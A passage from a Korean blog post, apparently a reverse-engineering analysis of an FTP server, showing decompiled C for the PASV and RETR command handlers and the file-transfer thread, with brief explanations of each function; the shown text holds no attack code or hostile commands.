</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(a2, file, v6, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>mlsd_sub 함수가 결과를 보내주는 역할을 한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>_BOOL8 <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">ftpPASV</span>(<span style="color:#66d9ef">__int64</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> v1; <span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">88</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">56</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">pasv_part_0</span>() )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__snprintf_chk</span>(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">12408</span>, <span style="color:#ae81ff">0x2000LL</span>, <span style="color:#ae81ff">1LL</span>, <span style="color:#ae81ff">0x2000LL</span>, <span style="color:#e6db74">&#34;227 Entering Passive Mode (%u,%u,%u,%u,%u,%u).</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">writelogentry</span>(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; entering passive mode&#34;</span>, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">12408</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">20600</span>) )
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>), (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">12408</span>), v1, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">20600</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>), <span style="color:#e6db74">&#34;550 Another action is in progress, use ABOR command first.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x3CuLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">20600</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>), <span style="color:#e6db74">&#34;530 Please login with USER and PASS.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x26uLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ftp 패시브 모드가 구현된 함수다.
포트를 열어주고 유저가 특정 포트로 접속해서 데이터를 받는 형식이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>_BOOL8 <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">ftpRETR</span>(<span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>mutex, <span style="color:#66d9ef">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> owner; <span style="color:#75715e">// edx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> lock; <span style="color:#75715e">// edi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> align; <span style="color:#75715e">// rdi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">pthread_t</span> newthread; <span style="color:#75715e">// [rsp+8h] [rbp-C0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> stat64 v10; <span style="color:#75715e">// [rsp+10h] [rbp-B8h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v11; <span style="color:#75715e">// [rsp+A8h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  owner <span style="color:#f92672">=</span> mutex[<span style="color:#ae81ff">2</span>].__owner;
</span></span><span style="display:flex;"><span>  v11 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>owner )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>mutex[<span style="color:#ae81ff">515</span>].__align )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;530 Please login with USER and PASS.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x26uLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>mutex[<span style="color:#ae81ff">1</span>].__kind )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>mutex[<span style="color:#ae81ff">515</span>].__align )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;550 Another action is in progress, use ABOR command first.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x3CuLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>a2 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>mutex[<span style="color:#ae81ff">515</span>].__align )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;501 Syntax error in parameters or arguments.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x2EuLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  lock <span style="color:#f92672">=</span> mutex[<span style="color:#ae81ff">2</span>].__lock;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( lock <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(lock);
</span></span><span style="display:flex;"><span>    mutex[<span style="color:#ae81ff">2</span>].__lock <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ftp_effective_path</span>(<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">105</span>].__align <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, <span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">3</span>], a2, <span style="color:#ae81ff">0x2000LL</span>, <span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">310</span>].__align <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">stat64</span>(<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">310</span>].__size[<span style="color:#ae81ff">8</span>], <span style="color:#f92672">&amp;</span>v10);
</span></span><span style="display:flex;"><span>  align <span style="color:#f92672">=</span> mutex[<span style="color:#ae81ff">515</span>].__align;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v5 <span style="color:#f92672">||</span> (v10.st_mode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4000</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( align )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;550 File or directory unavailable.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x24uLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( align )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;150 File status okay; about to open data connection.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x36uLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; RETR: &#34;</span>, a2);
</span></span><span style="display:flex;"><span>    mutex[<span style="color:#ae81ff">1</span>].__spins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(mutex);
</span></span><span style="display:flex;"><span>    v8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>newthread, <span style="color:#ae81ff">0LL</span>, retr_thread, mutex);
</span></span><span style="display:flex;"><span>    mutex[<span style="color:#ae81ff">1</span>].__kind <span style="color:#f92672">=</span> v8;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v8 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( mutex[<span style="color:#ae81ff">515</span>].__align )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;451 Requested action aborted. Local error in processing.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x3AuLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">1</span>].__align <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> newthread;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(mutex);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>RETR 명령어가 구현된 함수다.
파일을 읽는데 필요하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">retr_thread</span>(<span style="color:#66d9ef">__int64</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v1; <span style="color:#75715e">// rbp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>max_size; <span style="color:#75715e">// r13
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// r12d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v6; <span style="color:#75715e">// r14
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// rdi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v9; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v10; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v11; <span style="color:#75715e">// r14
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v13; <span style="color:#75715e">// [rsp+18h] [rbp-D0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> fd; <span style="color:#75715e">// [rsp+24h] [rbp-C4h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v15; <span style="color:#75715e">// [rsp+28h] [rbp-C0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> timespec tp; <span style="color:#75715e">// [rsp+30h] [rbp-B8h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  __pthread_unwind_buf_t buf; <span style="color:#75715e">// [rsp+40h] [rbp-A8h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  buf.__pad[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_mutex_lock</span>((<span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>)a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">__sigsetjmp</span>((<span style="color:#66d9ef">struct</span> __jmp_buf_tag <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cleanup_handler</span>((<span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>)a1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__pthread_unwind_next</span>(<span style="color:#f92672">&amp;</span>buf);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__pthread_register_cancel</span>(<span style="color:#f92672">&amp;</span>buf);
</span></span><span style="display:flex;"><span>  v15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">clock_gettime</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>tp);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>((<span style="color:#66d9ef">size_t</span>)<span style="color:#f92672">&amp;</span>_data_start);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v1 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_26;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_datasocket</span>(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( fd <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">20600</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ftp_init_tls_session</span>(<span style="color:#f92672">&amp;</span>v15, fd, <span style="color:#ae81ff">0</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_6;
</span></span><span style="display:flex;"><span>      max_size <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">gnutls_record_get_max_size</span>(v15);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( max_size <span style="color:#f92672">&gt;</span> <span style="color:#f92672">&amp;</span>_data_start )
</span></span><span style="display:flex;"><span>        max_size <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_data_start;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      max_size <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_data_start;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open64</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">12408</span>), <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>) <span style="color:#f92672">=</span> v4;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> v4;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">104</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">lseek64</span>(v4, <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">104</span>), <span style="color:#ae81ff">0</span>) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">60</span>) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>          v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            v10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(v5, v1, (<span style="color:#66d9ef">size_t</span>)max_size);
</span></span><span style="display:flex;"><span>            v11 <span style="color:#f92672">=</span> v10;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v10 )
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( v10 <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>              v9 <span style="color:#f92672">=</span> v15 <span style="color:#f92672">?</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">:</span> <span style="color:#a6e22e">send</span>(fd, v1, v10, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> ( v11 <span style="color:#f92672">==</span> v9 )
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            v13 <span style="color:#f92672">=</span> v8;
</span></span><span style="display:flex;"><span>            v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">goto</span> LABEL_41;
</span></span><span style="display:flex;"><span>            v8 <span style="color:#f92672">+=</span> v11;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">!*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">60</span>) );
</span></span><span style="display:flex;"><span>          v13 <span style="color:#f92672">=</span> v8;
</span></span><span style="display:flex;"><span>          v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>LABEL_41:
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">clock_gettime</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>tp);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">20616</span>) <span style="color:#f92672">+=</span> v13;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">20632</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__snprintf_chk</span>(
</span></span><span style="display:flex;"><span>          (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v1,
